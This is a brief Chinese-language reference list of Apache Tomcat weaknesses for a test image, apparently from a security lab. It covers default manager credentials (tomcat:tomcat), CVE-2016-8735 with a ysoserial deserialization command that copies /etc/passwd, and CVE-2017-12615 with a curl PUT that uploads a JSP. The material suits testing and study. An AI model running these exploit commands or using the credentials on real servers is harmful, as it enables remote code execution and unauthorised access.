### 运维安全 - /manager/html 弱口令

测试镜像

* src/base/tomcat7.0/

后台口令

* tomcat:tomcat

### 运维安全 - /examples 目录未删除

测试镜像

* src/base/tomcat7.0/

### CVE-2016-8735 - JmxRemoteLifecycleListener 反序列化漏洞

测试镜像

* src/base/tomcat7.0/

影响版本

* Apache Tomcat 9.0.0.M1 to 9.0.0.M11
* Apache Tomcat 8.5.0 to 8.5.6
* Apache Tomcat 8.0.0.RC1 to 8.0.38
* Apache Tomcat 7.0.0 to 7.0.72
* Apache Tomcat 6.0.0 to 6.0.47

参考链接

* [Apache Tomcat多版本远程代码执行CVE-2016-8735(附POC)](https://www.anquanke.com/post/id/85043)

Poc

```
java -cp /tmp/ysoserial.jar ysoserial.exploit.RMIRegistryExploit 127.0.0.1 10001 Groovy1 "cp /etc/passwd /tmp"
```

### CVE-2017-12615 - tomcat PUT 任意文件上传漏洞

测试镜像

* src/base/tomcat7.0/

参考链接

* [Tomcat代码执行漏洞分析测试(附POC)](https://mp.weixin.qq.com/s/dgWT3Cgf1mQs-IYxeID_Mw)

Poc

```
curl -vv -X PUT http://127.0.0.1/test.jsp/ -H 'Content-Type: text/plain' --data @test.jsp
```

